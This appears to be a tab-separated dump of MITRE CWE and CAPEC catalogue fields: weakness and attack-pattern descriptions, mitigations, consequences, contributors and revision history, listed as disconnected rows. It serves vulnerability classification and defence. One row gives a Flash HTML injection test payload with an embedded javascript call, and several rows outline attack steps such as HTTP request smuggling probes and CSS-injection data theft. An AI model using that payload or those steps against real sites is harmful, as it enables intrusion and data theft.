10069	89	Detailed
19093	59	Updated Description Summary, Examples-Instances, Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit
21951	35	Cigital
24407	103	Primary
7598	56	ChildOf
20816	28	CWE Content Team
24649	62	updated Applicable_Platforms, Demonstrative_Examples, Description, Name, Observed_Examples, Potential_Mitigations, Terminology_Notes
11941	62	updated Name
17026	79	Integrity
9636	56	ChildOf
12668	46	While assertion is good for catching logic errors and reducing the chances of reaching more serious vulnerability conditions, it can still lead to a denial of service.             For example, if a server handles multiple simultaneous connections, and an assert() occurs in one single connection that causes all other connections to be dropped, this is a reachable assertion that leads to a denial of service.
24139	42	Implement more intelligent password throttling mechanisms such as those which take IP address into account, in addition to the login name.
8249	27	This attack can be carried out via a network mapper/scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.
21307	33	Frank Piessens
9306	35	MITRE
13910	28	CWE Content Team
20362	28	CWE Content Team
14010	76	2019-04-04
10979	39	2017-11-08
8133	59	Updated Description Summary
14175	97	Choosing Message Identifier
17803	50	Get your Public Key signed by a Certificate Authority
6232	31	1000
16558	101	CAPEC Content Team
16265	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
16478	47	Other
14506	46	As data is parsed, an injected element may cause the process to take unexpected actions.
12524	71	2008
10512	39	2013-02-21
21170	28	CWE Content Team
21571	25	High
16685	91	Implementation
10142	21	CWE Content Team
6060	28	Eric Dalci
19952	69	Incomplete
20950	103	Primary
6530	39	2012-10-30
11913	95	Capturing Application Code Bound During Patching                   Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.
17981	31	699
17583	21	CWE Content Team
25096	66	SQL Injection Cheat Sheet
22706	77	Architecture or Design Review
14737	31	1000
9690	62	updated Common_Consequences
16688	85	470
11424	35	MITRE
17582	62	updated Common_Consequences
8366	100	The MITRE Corporation
14177	102	ChildOf
16326	23	The software allows a file to be uploaded, but it relies on the file name or extension of the file to determine the appropriate behaviors. This could be used by attackers to cause the file to be misclassified and processed in a dangerous fashion.
15283	97	XSS Using Alternate Syntax
21618	49	2004
12669	28	CWE Content Team
22892	55	CAPEC Content Team
7455	90	Language-Independent
5887	35	MITRE
23342	62	updated Applicable_Platforms, Functional_Areas
10757	35	MITRE
5668	62	updated Common_Consequences
25152	39	2008-09-08
15119	42	Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   For example, glibc in Linux provides protection against free of invalid pointers.
6007	97	Format String Injection
10718	31	1000
6549	28	Eric Dalci
17557	28	CWE Content Team
21414	28	Eric Dalci
22499	62	updated References, Relationships
14630	55	CAPEC Content Team
18674	69	Incomplete
16218	28	CWE Content Team
6656	66	Top 25 Series - Rank 18 - Incorrect Calculation of Buffer Size
9846	76	2018-07-31
11913	73	Attacker loads the sniffer to capture the application code bound during a dynamic update.
22292	39	2008-07-01
24954	28	CWE Content Team
21022	39	2019-01-03
23382	35	MITRE
21900	62	updated Common_Consequences
12205	35	MITRE
16267	76	2017-08-04
15556	28	CWE Content Team
16909	56	ChildOf
13624	69	Incomplete
19663	81	Confidentiality
22981	76	2015-12-07
22668	62	updated Common_Consequences, References, Relationships
13623	62	updated Description
17259	35	MITRE
24769	39	2019-06-20
25103	39	2014-07-30
19872	50	Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.
8570	35	MITRE
6809	50	Properly encrypt and sign identity tokens in transit, and use industry standard session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf. Utilize a session timeout for all sessions. If the user does not explicitly logout, terminate their session after this period of inactivity. If the user logs back in then a new session key should be generated.
22418	62	updated Background_Details, Demonstrative_Examples, Description, Observed_Examples, Other_Notes, Potential_Mitigations
7512	45	Base
12802	62	updated Demonstrative_Examples
10477	62	updated Relationships
19812	28	Sean Eidemiller
20840	24	MITRE
15949	50	Validate software updates before installing.
11225	79	Confidentiality
24560	57	Indirect
7839	102	CanFollow
8388	62	updated Maintenance_Notes, Modes_of_Introduction, Other_Notes, Relationships
8020	35	MITRE
6901	62	updated Potential_Mitigations, References
8003	99	SANS Software Security Institute
5816	62	updated Related_Attack_Patterns
23453	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
10551	90	Language-Independent
17322	35	Cigital
9691	23	The software does not follow, or incorrectly follows, the chain of trust for a certificate back to a trusted root certificate, resulting in incorrect trust of any resource that is associated with that certificate.
21796	39	2008-09-08
23411	91	Policy
18846	21	CWE Content Team
16543	90	C
11706	78	High
24021	62	updated Modes_of_Introduction, Relationships, Taxonomy_Mappings
10664	35	MITRE
16487	35	MITRE
9377	39	2017-11-08
16711	26	Architecture and Design
7725	62	updated Likelihood_of_Exploit, Relationships, Taxonomy_Mappings, Weakness_Ordinalities
15287	62	updated Relationships, Taxonomy_Mappings
16436	35	MITRE
21355	21	CWE Content Team
10368	62	updated Potential_Mitigations, Relationships
10929	81	Other
10381	42	Run or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code.                   Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64].
11711	80	The attacker can use automated tools to probe for variables that she can control.
25017	62	updated Common_Consequences
9691	45	Base
24016	47	Gain Privileges
5984	62	updated Relationships
19764	49	2007
14398	91	Architecture and Design
16082	35	MITRE
19602	49	2010
9368	91	Implementation
22021	35	MITRE
21420	63	Quality Degradation
6669	62	updated Potential_Mitigations
9607	62	updated Relationships, Taxonomy_Mappings
22767	28	CWE Content Team
25387	61	Draft
7785	33	Microsoft
20786	45	Variant
25119	35	MITRE
18511	23	An adversary installs or adds malicious logic (also known as malware) into a seemingly benign component of a fielded system. This logic is often hidden from the user of the system and works behind the scenes to achieve negative impacts. With the proliferation of mass digital storage and inexpensive multimedia devices, Bluetooth and 802.11 support, new attack vectors for spreading malware are emerging for things we once thought of as innocuous greeting cards, picture frames, or digital projectors. This pattern of attack focuses on systems already fielded and used in operation as opposed to systems and their components that are still under development and part of the supply chain.
14506	45	Variant
11686	62	updated Relationships
12692	91	Architecture and Design
10647	28	CWE Content Team
12838	24	MITRE
12363	48	10
19609	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
19772	35	MITRE
22839	62	updated Description, Related_Attack_Patterns
12039	28	CWE Content Team
21801	39	2008-07-01
11989	62	updated Potential_Mitigations
20788	35	MITRE
15481	88	Improper Handling of Alternate Encoding
19825	28	CWE Content Team
17273	103	Primary
8752	62	updated Common_Consequences
17217	62	updated Relationships, Taxonomy_Mappings
21020	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
17295	62	updated Common_Consequences, Demonstrative_Examples, Observed_Examples, References, Related_Attack_Patterns, Relationships
12267	35	Cigital
22695	78	Medium
17271	28	CWE Content Team
10797	62	updated Demonstrative_Examples, Potential_Mitigations
6662	31	699
5590	95	Insert the malicious data into the stream that takes advantage of the configuration flaw.
20679	39	2018-03-27
23881	90	Language-Independent
20569	50	Design: The victim's site could protect all potentially sensitive functionality (e.g. search functions) with cross site request forgery (CSRF) protection and not perform any work on behalf of forged requests                Design: The browser's security model could be fixed to not leak timing information for cross domain requests
19199	39	2008-07-01
20759	59	Updated Attack_Phases
15243	49	2007
20090	42	Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.
11035	101	CAPEC Content Team
7659	62	updated Common_Consequences
6248	39	2010-06-21
11310	28	CWE Content Team
6784	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Bytecode Weakness Analysis - including disassembler + source code weakness analysis
14489	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Context-configured Source Code Weakness Analyzer
7277	88	Unchecked Return Value
22461	25	High
22417	39	2017-11-08
8485	35	MITRE
23124	63	Other
19241	62	updated Relationships
8183	39	2008-07-01
10137	39	2011-03-29
10104	62	updated Related_Attack_Patterns
8882	28	CWE Content Team
12357	69	Draft
20978	74	2
6855	97	Modification of Registry Run Keys
9278	62	updated Potential_Mitigations
9041	81	Integrity
14769	62	updated Potential_Mitigations
21781	103	Primary
17253	21	PLOVER
7836	39	2018-03-27
6042	56	ChildOf
8359	76	2019-09-30
9785	23	This attack is a form of Cross-Site Scripting (XSS) where malicious scripts are embedded in elements that are not expected to host scripts such as image tags (<img>), comments in XML documents (< !-CDATA->), etc. These tags may not be subject to the same input validation, output validation, and other content filtering and checking routines, so this can create an opportunity for an attacker to tunnel through the application's elements and launch a XSS attack through other elements. As with all remote attacks, it is important to differentiate the ability to launch an attack (such as probing an internal network for unpatched servers) and the ability of the remote attacker to collect and interpret the output of said attack.
24932	42	Hard-code the search path to a set of known-safe values (such as system directories), or only allow them to be specified by the administrator in a configuration file. Do not allow these settings to be modified by an external party. Be careful to avoid related weaknesses such as CWE-426 and CWE-428.
20700	43	Simple
20093	95	[Probe entry points to locate vulnerabilities] The attacker uses the entry points gathered in the "Explore" phase as a target list and injects various payloads using a variety of different types of encodings to determine if an entry point actually represents a vulnerability with insufficient validation logic and to characterize the extent to which the vulnerability can be exploited.
24317	62	updated Common_Consequences
9624	91	Operation
13827	35	MITRE
22990	40	This attack pattern requires that the adversary has cooperation from the registrar of the target domain.
7390	33	Moritz Lipp
17039	104	305
16139	62	updated Relationships
17183	23	An attacker makes use of Cascading Style Sheets (CSS) injection to steal data cross domain from the victim's browser. The attack works by abusing the standards relating to loading of CSS: 1. Send cookies on any load of CSS (including cross-domain) 2. When parsing returned CSS ignore all data that does not make sense before a valid CSS descriptor is found by the CSS parser By having control of some text in the victim's domain, the attacker is able to inject a seemingly valid CSS string. It does not matter if this CSS string is preceded by other data. The CSS parser will still locate the CSS string. If the attacker is able to control two injection points, one before the cross domain data that the attacker is interested in receiving and the other one after, the attacker can use this attack to steal all of the data in between these two CSS injection points when referencing the injected CSS while performing rendering on the site that the attacker controls. When rendering, the CSS parser will detect the valid CSS string to parse and ignore the data that "does not make sense". That data will simply be rendered. That data is in fact the data that the attacker just stole cross domain. The stolen data may contain sensitive information, such CSRF protection tokens.
11104	63	Read Application Data
19826	62	updated Potential_Mitigations
5799	56	ChildOf
7814	35	MITRE
23525	39	2009-12-28
24759	53	The MITRE Corporation
20871	42	Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.
14318	31	1000
7181	28	CWE Content Team
10566	100	The MITRE Corporation
9780	90	Java
13335	39	2008-07-01
19787	39	2017-11-08
8460	25	Low
21032	59	Updated Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Resources_Required
19341	62	updated Common_Consequences
19041	40	Target software must be able to execute scripts, and also grant the adversary privilege to write/upload scripts.
15250	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
24513	55	CAPEC Content Team
16308	26	Architecture and Design
16466	51	2014-06-23
21962	62	updated Description, Other_Notes
16074	47	Modify Data
20087	62	updated Common_Consequences
18182	35	MITRE
20240	35	MITRE
7280	76	2018-07-31
6128	81	Confidentiality
14625	39	2017-11-08
20620	28	CWE Content Team
23494	46	This can be used by an attacker to bypass the validation and launch attacks that expose weaknesses that would otherwise be prevented, such as injection.
13651	28	CWE Content Team
19419	35	MITRE
6898	62	updated Relationships, Taxonomy_Mappings
17007	103	Primary
14800	62	Suggested OWASP Top Ten 2004 mapping
12286	79	Authorization
16502	100	The MITRE Corporation
17067	77	Black Box
16467	35	MITRE
20222	45	Base
5899	53	The MITRE Corporation
21757	39	2011-06-01
23006	35	MITRE
9726	42	Be sure to set the level of logging appropriately in a production environment. Sufficient data should be logged to enable system administrators to detect attacks, diagnose errors, and recover from attacks. At the same time, logging too much data (CWE-779) can cause the same problems.
22157	45	Base
13043	68	Note that this can probably be bypassed using XSS (CWE-79), or when using web technologies that enable the attacker to read raw headers from HTTP requests.
6000	51	2017-01-12
6549	35	Cigital
23044	40	The various resources, or individual URLs, must be somehow discoverable by the attacker
6003	39	2017-11-08
6488	42	Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C ("Approved Random Number Generators").
9635	31	1000
15992	103	Primary
13340	92	Exploit
17491	80	Ability to craft malicious scripts or find them elsewhere and ability to identify functionality that is running web controls in the local zone and to find an injection vector into that functionality
21918	62	updated Relationships, Taxonomy_Mappings
8124	103	Primary
12162	39	2019-01-03
11544	35	MITRE
18373	39	2017-11-08
17665	62	updated Description
10551	43	Simple
15610	104	307
24527	35	MITRE
22067	28	CWE Content Team
16083	101	CAPEC Content Team
14916	35	MITRE
15397	28	CWE Content Team
25144	53	The MITRE Corporation
15263	81	Integrity
21675	62	updated Relationships, Taxonomy_Mappings
9073	28	Eric Dalci
20436	79	Confidentiality
16645	39	2014-06-23
11187	50	Operational: Use OS-level preventative functionality. Not a complete solution.
7972	39	2012-12-28
9632	35	MITRE
6853	57	Indirect
10672	69	Incomplete
15675	28	CWE Content Team
16024	62	updated Relationships
10129	35	MITRE
11204	35	Cigital
19003	62	updated Description, Other_Notes
23432	73	The attacker makes it as likely as possible that the vulnerable functionality into which he has injected the payload has a high likelihood of being used by the victim.
21695	28	CWE Content Team
8389	39	2010-09-27
13550	61	Draft
6365	42	Use an input validation framework such as Struts or the OWASP ESAPI Validation API. If you use Struts, be mindful of weaknesses covered by the CWE-101 category.
20710	39	2010-09-27
15279	79	Integrity
16800	62	updated Relationships
9073	39	2008-07-01
17438	35	MITRE
25103	62	updated Relationships, Taxonomy_Mappings
17702	57	Primary
17683	85	93
20520	28	CWE Content Team
23337	35	MITRE
8487	35	MITRE
17857	62	updated Common_Consequences
18382	76	2017-01-09
24533	63	DoS: Crash, Exit, or Restart
17990	28	CWE Content Team
15126	76	2019-04-04
21739	39	2010-09-27
6768	77	Automated Static Analysis
15042	27	A utility that allows for the viewing and modification of cookies. Many modern web browsers support this behavior.
8339	39	2011-03-29
23449	62	updated Time_of_Introduction
13026	35	MITRE
12978	61	Draft
19662	60	03
8926	86	http://www.export.gov/safeharbor/
23146	31	699
6870	39	2019-09-19
22412	53	The MITRE Corporation
7457	62	updated Common_Consequences
22405	63	Gain Privileges or Assume Identity
11090	39	2011-06-01
14829	86	https://www.troyhunt.com/c-is-for-cookie-h-is-for-hacker/
7178	28	CWE Content Team
12719	59	Updated References
23716	62	updated Relationships
14739	63	Execute Unauthorized Code or Commands
12227	39	2011-03-29
14343	24	MITRE
7312	33	Sean Barnum
21190	62	updated Modes_of_Introduction, Relationships, Relevant_Properties
25409	51	2015-11-09
8119	59	Updated Attack_Phases
23984	35	MITRE
21892	63	Read Files or Directories
10318	81	Confidentiality
12148	27	Access to the schema and the knowledge and ability modify it. Ability to replace or redirect access to the modified schema.
16970	47	Modify Data
20814	40	The adversary must have a means (i.e., a pre-installed tool or background process) by which to collect data from the clipboard and store it. That is, when the target copies data to the clipboard (e.g., to paste into another application), the adversary needs some means of capturing that data in a third location.
19182	54	Low
23204	62	updated Relationships
10420	39	2010-04-05
9559	36	http://www.securityfocus.com/archive/1/archive/1/491864/100/0/threaded
24426	39	2008-09-08
8205	62	updated Relationships, Relationship_Notes, Taxonomy_Mappings
24800	28	CWE Content Team
20756	31	1000
24102	79	Access Control
22559	28	CWE Content Team
12459	56	ChildOf
9427	62	updated Relationships
15601	35	MITRE
20651	62	updated Likelihood_of_Exploit, Observed_Examples, Taxonomy_Mappings, Type
11620	42	Do not suggest insecure configuration changes in documentation, especially if those configurations can extend to resources and other programs that are outside the scope of the application.
22861	26	Architecture and Design
10004	39	2017-11-08
16223	35	MITRE
24431	62	Added a White_Box_Definition and clarified the consequences.
10695	56	ChildOf
15162	44	SOAR Partial
17396	39	2014-07-30
23650	59	Updated Related_Attack_Patterns
6829	35	MITRE
23817	90	Language-Independent
14455	62	updated Potential_Mitigations
14210	35	MITRE
11380	28	CWE Content Team
24506	28	CWE Content Team
23443	80	Good understanding of the HTTP protocol and the parsing mechanisms employed by various web servers
17704	28	CWE Content Team
6090	69	Incomplete
20494	91	Architecture and Design
7866	101	CAPEC Content Team
9541	91	Implementation
22919	35	MITRE
8675	36	http://msgs.securepoint.com/bugtraq/
23547	91	Architecture and Design
25322	33	SPI Dynamics
15554	35	MITRE
18497	28	CWE Content Team
16177	101	CAPEC Content Team
5676	62	updated Potential_Mitigations
9470	90	Language-Independent
7017	45	Base
6938	79	Confidentiality
10639	35	MITRE
18503	81	Availability
17237	35	Cigital
17682	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Bytecode Weakness Analysis - including disassembler + source code weakness analysis                            Binary Weakness Analysis - including disassembler + source code weakness analysis
9613	35	MITRE
6277	44	High
14443	26	Architecture and Design
19656	39	2012-05-11
18975	39	2011-06-01
10042	88	Assigning instead of Comparing
19871	62	updated Description
9215	103	Primary
7376	59	Updated Description, Description Summary
22751	69	Incomplete
17176	23	An adversary attempts to deceive a GPS receiver by broadcasting counterfeit GPS signals, structured to resemble a set of normal GPS signals. These spoofed signals may be structured in such a way as to cause the receiver to estimate its position to be somewhere other than where it actually is, or to be located where it is but at a different time, as determined by the adversary.
7536	35	MITRE
24935	46	The lack of a prologue can make it more difficult to accurately and quickly understand the associated code. Standard prologues or headers may contain information such as module name, version number, author, date, purpose, function, assumptions, limitations, accuracy considerations, etc. This issue makes it more difficult to maintain the software due to insufficient analyzability, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
19665	104	1087
6474	76	2017-08-04
13315	91	Implementation
15707	47	Execute Unauthorized Commands
19720	35	MITRE
9003	56	ChildOf
23281	28	CWE Content Team
10238	103	Primary
19053	92	Exploit
17868	46	This issue makes it more difficult to maintain and/or port the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
13798	91	Implementation
21223	62	updated Observed_Examples, Relationships
9188	28	CWE Content Team
11127	89	Standard
18900	85	61
24251	62	updated Relationships, Taxonomy_Mappings
14945	28	Eric Dalci
21676	28	CWE Content Team
22369	35	Cigital
6975	84	27
7525	61	Stable
24685	39	2008-11-24
17857	39	2011-06-01
8266	81	Integrity
16671	81	Access Control
14174	35	MITRE
19914	100	The MITRE Corporation
24095	35	MITRE
6085	62	updated Relationships, Other_Notes, Taxonomy_Mappings
19436	35	MITRE
13958	81	Access Control
19362	39	2008-09-08
11472	103	Primary
5753	22	05
19843	91	Implementation
25324	101	CAPEC Content Team
25319	56	ChildOf
17765	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
10895	62	updated Relationships
15235	45	Base
17576	62	updated Description, Name, Relationships
19803	62	updated Demonstrative_Examples
8457	90	C++
7892	39	2017-11-08
17944	31	1000
13563	88	Unchecked Input for Loop Condition
19828	101	CAPEC Content Team
14326	63	DoS: Crash, Exit, or Restart
17164	39	2012-10-30
12657	84	15
24409	39	2012-05-11
14137	62	updated Relationships, Taxonomy_Mappings
24511	26	Implementation
24427	89	Detailed
20698	36	http://www.rt.com/man/syslog.3.html
6889	39	2017-05-03
12538	39	2009-05-27
5661	56	ChildOf
10862	33	Web Application Security Consortium
10190	71	2012
12094	39	2008-11-24
18158	86	https://arxiv.org/abs/1312.6199
17296	28	CWE Content Team
19610	89	Detailed
13029	63	Modify Files or Directories
20090	91	Architecture and Design
10124	33	Steve Orrin
15571	62	updated Related_Attack_Patterns, Taxonomy_Mappings
8201	39	2008-09-08
18266	62	updated Maintenance_Notes, Theoretical_Notes
5691	56	ChildOf
18032	95	[Survey application] The adversary takes an inventory of the entry points of the application.
8451	50	Design: Default deny access control policies
9854	102	ChildOf
9137	79	Access Control
13746	39	2009-07-27
18587	23	The software constructs a string for a command to executed by a separate component in another control sphere, but it does not properly delimit the intended arguments, options, or switches within that command string.
6919	31	699
11956	46	This weakness captures cases in which a particular code segment is always incorrect with respect to the algorithm that it is implementing. For example, if a C programmer intends to include multiple statements in a single block but does not include the enclosing braces (CWE-483), then the logic is always incorrect. This issue is in contrast to most weaknesses in which the code usually behaves correctly, except when it is externally manipulated in malicious ways.
17697	88	Information Exposure Through Indexing of Private Data
20985	62	updated Demonstrative_Examples
11934	91	Architecture and Design
18351	21	PLOVER
21429	103	Primary
18605	26	Implementation
8304	91	Architecture and Design
14899	76	2017-01-09
20979	62	updated Description
19890	35	MITRE
23253	56	ChildOf
15301	62	updated Description
20388	62	updated Common_Consequences
19424	94	Run Arbitrary Code
14675	61	Draft
6260	91	Architecture and Design
7342	72	The use of previously freed memory may corrupt valid data, if the memory area in question has been allocated and used properly elsewhere.
11107	35	MITRE
16579	73	Test the page using Flash HTML injection, "'><img src='asfunction:getURL,javascript:gotRoot("")//.jpg' >
19434	62	updated Demonstrative_Examples, References, Relationships, Taxonomy_Mappings
17648	28	CWE Content Team
17312	88	Incorrect Calculation
19514	35	MITRE
13418	101	CAPEC Content Team
9016	28	CWE Content Team
14437	28	CWE Content Team
23777	26	Implementation
10102	28	CWE Content Team
18267	76	2017-08-04
24227	35	MITRE
7417	28	CWE Content Team
11653	66	Magic AI: These are the Optical Illusions that Trick, Fool, and Flummox Computers
23178	55	CAPEC Content Team
19623	28	CWE Content Team
8985	95	[Probe for vulnerable differences in HTTP parsing chain] Attacker sends malformed HTTP Requests to the application looking for differences in the ways that individual layers in the parsing chain parse requests. When differences are identified, the attacker crafts specially malformed HTTP requests to determine if the identified parsing differences will allow extra requests to be smuggled through parsing layers.
21659	28	Eric Dalci
19531	103	Primary
15008	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.                   Use a built-in path canonicalization function (such as realpath() in C) that produces the canonical version of the pathname, which effectively removes ".." sequences and symbolic links (CWE-23, CWE-59). This includes:                                                                  realpath() in C                         getCanonicalPath() in Java                         GetFullPath() in ASP.NET                         realpath() or abs_path() in Perl                         realpath() in PHP
23442	28	CWE Content Team
9845	23	The application stores sensitive data in memory that is not locked, or that has been incorrectly locked, which might cause the memory to be written to swap files on disk by the virtual memory manager. This can make the data more accessible to external actors.
23881	69	Draft
7111	103	Primary
17723	40	The adversary needs to first obtain the hashed credentials of a user, via the use of a tool, prior to executing this attack.
8434	39	2011-06-01
22249	28	CWE Content Team
6119	35	Cigital
21586	40	The attacker must have working knowledge of some if not all of the components involved in the IDE system as well as the infrastructure.
6650	35	MITRE
13333	100	The MITRE Corporation
17756	85	320
11718	104	475
9778	35	MITRE
17555	28	CWE Content Team
7401	89	Standard
23498	91	Architecture and Design
5779	45	Base
20699	28	CWE Content Team
20689	23	The software establishes a communication channel with an endpoint and receives a message from that endpoint, but it does not sufficiently ensure that the message was not modified during transmission.
19317	76	2017-08-04
17800	31	700
25230	43	Simple
24531	39	2008-07-01
14096	28	CWE Content Team
16588	79	Authorization
15207	62	updated Common_Consequences, Other_Notes
20249	87	Database Server
6635	23	An attacker examines a target application's cache for sensitive information. Many applications that communicate with remote entities or which perform intensive calculations utilize caches to improve efficiency. However, if the application computes or receives sensitive information and the cache is not appropriately protected, an attacker can browse the cache and retrieve this information. This can result in the disclosure of sensitive information.
16562	59	Updated Related_Weaknesses
18485	28	CWE Content Team
18815	91	Operation
14258	35	MITRE
23410	103	Primary
12341	39	2014-06-23
7445	90	Language-Independent
22728	31	1000
17977	62	updated Name, Relationships
10451	79	Access Control
21925	90	Language-Independent
18124	89	Standard
10945	81	Access Control
9685	35	MITRE
14272	103	Primary
16366	81	Non-Repudiation
10977	62	updated Applicable_Platforms, Relationships, Other_Notes, Taxonomy_Mappings
14163	35	MITRE
6640	28	CWE Content Team
22240	79	Integrity
25300	79	Confidentiality
9826	62	updated Related_Attack_Patterns
12514	74	3
17578	51	2014-06-23
13859	62	updated Potential_Mitigations
7804	28	CWE Content Team
7285	103	Primary
11681	34	This issue can be introduced when the requirements for the algorithm are not clearly stated.
15235	88	Reliance on Cookies without Validation and Integrity Checking
18511	85	441
11410	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Focused Manual Spotcheck - Focused manual analysis of source                            Manual Source Code Review (not inspections)
24951	28	CWE Content Team
11751	39	2017-05-03
9980	55	CAPEC Content Team
6190	39	2009-05-27
6721	39	2011-03-29
9042	81	Other
25130	28	CWE Content Team
8538	35	MITRE
11278	47	Read Data
19691	59	Updated Resources_Required
21642	88	Misinterpretation of Input
20583	42	It is reasonable to add artificial or random delays so that the amount of CPU time consumed is independent of the action being taken by the application.
19745	63	Modify Application Data
13004	28	CWE Content Team
15527	39	2017-11-08
20664	44	High
17249	56	ChildOf
8505	62	updated Applicable_Platforms
15197	31	1000
9589	79	Confidentiality
25170	45	Base
22695	85	157
13455	39	2015-12-07
12339	90	C++
21698	91	Requirements
18095	101	CAPEC Content Team
23378	49	2007
12472	44	SOAR Partial
13996	35	MITRE
7980	62	updated Relationships, Taxonomy_Mappings
19502	35	Cigital
6085	39	2008-09-08
13475	76	2015-12-07
12430	102	ChildOf
6387	39	2010-02-16
11283	62	updated Demonstrative_Examples, Description, Likelihood_of_Exploit, Name, Observed_Examples, Other_Notes, Potential_Mitigations, Relationships, Research_Gaps, Time_of_Introduction
16597	36	https://www-users.cs.umn.edu/~hoppernj/celluloc.pdf
13741	28	CWE Content Team
15563	35	MITRE
22133	33	Tony Sintes
24617	55	CAPEC Content Team
11880	23	A function, method, procedure, etc. contains an excessive amount of code that has been      commented out within its body.
12656	35	MITRE
24377	101	CAPEC Content Team
23915	61	Draft
14052	104	221
19749	104	688
15541	72	If hard-coded passwords are used, it is almost certain that malicious users will gain access to the account in question.
23728	39	2011-06-01
22155	28	CWE Content Team
21276	102	ChildOf
22381	63	Modify Files or Directories
6424	76	2019-09-30
20011	59	Updated Mitigations
7627	39	2008-09-08
11102	28	CWE Content Team
12623	91	Architecture and Design
17260	97	Command Injection
10950	91	Implementation
10815	39	2017-11-08
6328	56	ChildOf
6150	103	Primary
23514	79	Access Control
12609	62	updated Applicable_Platforms, Causal_Nature, Relationships
15741	21	CLASP
20350	63	DoS: Resource Consumption (Other)
6051	28	CWE Content Team
6335	28	CWE Content Team
16405	39	2008-11-24
18490	28	CWE Content Team
16289	44	SOAR Partial
24732	91	Implementation
17265	28	CWE Content Team
19435	62	updated Relationships
11885	28	CWE Content Team
11378	79	Confidentiality
9358	100	The MITRE Corporation
11683	62	updated Demonstrative_Examples
8810	26	Operation
18034	39	2012-10-30
13159	61	Draft
12600	31	1000
5638	33	Microsoft
23290	39	2009-03-10
15489	39	2011-06-01
18696	44	High
22807	96	2018-07-02
15052	85	324
25093	101	CAPEC Content Team
22573	91	Architecture and Design
18884	62	updated Relationships
10088	62	updated Time_of_Introduction
23591	28	CWE Content Team
25002	28	CWE Content Team
16249	39	2013-07-17
17028	39	2009-05-27
19756	39	2017-11-08
9576	40	If the purpose of the Domain Fronting is to hide redirected C2 traffic, the C2 server must have been created in the CDN.
20993	39	2011-06-01
11109	101	CAPEC Content Team
10270	62	updated Potential_Mitigations
19564	62	updated Potential_Mitigations, References
5718	91	Installation
20951	21	CWE Content Team
8748	91	Implementation
19020	81	Availability
22962	45	Base
10786	28	CWE Content Team
19496	35	KDM Analytics
17512	68	This approach is still susceptible to calculation errors, including issues such as off-by-one errors (CWE-193) and incorrectly calculating buffer lengths (CWE-131).
23906	88	Improper Neutralization of HTTP Headers for Scripting Syntax
9780	23	The application has a validator form that either does not define a validate() method, or defines a validate() method but does not call super.validate().
19060	81	Confidentiality
9583	66	Automated Source Code Reliability Measure (ASCRM)
21122	91	Architecture and Design
15776	85	331
19774	21	PLOVER
12807	55	CAPEC Content Team
11072	35	MITRE
11117	35	MITRE
14612	28	CWE Content Team
19423	62	updated Potential_Mitigations
9392	103	Primary
8308	69	Draft
11543	62	updated Related_Attack_Patterns
10005	28	CWE Content Team
11083	31	1000
21003	62	Removed C from Applicable_Platforms
7005	62	updated Common_Consequences, Description, Likelihood_of_Exploit, Maintenance_Notes, Name, Observed_Examples, Other_Notes, Potential_Mitigations, Relationships, Time_of_Introduction
21319	62	updated Common_Consequences, References, Relationships
13557	62	updated References, Relationships
8127	62	added/updated demonstrative examples
23281	35	MITRE
15382	35	MITRE
23656	83	3rd "Zero Day" Edition
14495	39	2008-07-01
16436	28	CWE Content Team
17763	35	MITRE
16228	36	http://blog.quaji.com/2009/12/out-of-context-information-disclosure.html
19661	35	Cigital
13376	47	Gain Privileges
6106	35	MITRE
15654	28	CWE Content Team
15493	62	updated Potential_Mitigations
20279	42	Use an email client that has strict filters and prevents messages that mix character sets to end up in a user's inbox.                   Certain email clients such as Google's GMail prevent the use of non-Latin characters in email addresses or in links contained within emails. This helps prevent homoglyph attacks by flagging these emails and redirecting them to a user's spam folder.
23382	28	CWE Content Team
6984	27	None: No specialized resources are required to execute this type of attack.
5842	61	Draft
23518	35	MITRE
10192	35	MITRE
17173	62	updated Alternate_Terms, Applicable_Platforms, Background_Details, Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
23671	62	updated Relationships
21038	39	2011-06-01
20842	61	Draft
17508	47	Other
17359	63	Bypass Protection Mechanism
23883	62	updated Common_Consequences
